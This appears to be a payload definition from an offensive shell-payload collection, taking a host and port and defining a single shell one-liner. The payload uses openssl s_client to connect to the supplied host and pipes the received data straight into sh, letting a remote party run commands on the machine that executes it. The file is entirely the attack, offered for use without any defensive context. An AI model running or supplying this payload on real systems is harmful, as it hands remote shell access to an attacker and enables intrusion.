USAGE = 'host port'
NARGS = [2, 2]
LANG = 'sh'
EXEC = 'PAYLOAD'

pl = '''
openssl s_client -quiet -connect ARG1:ARG2|sh
'''
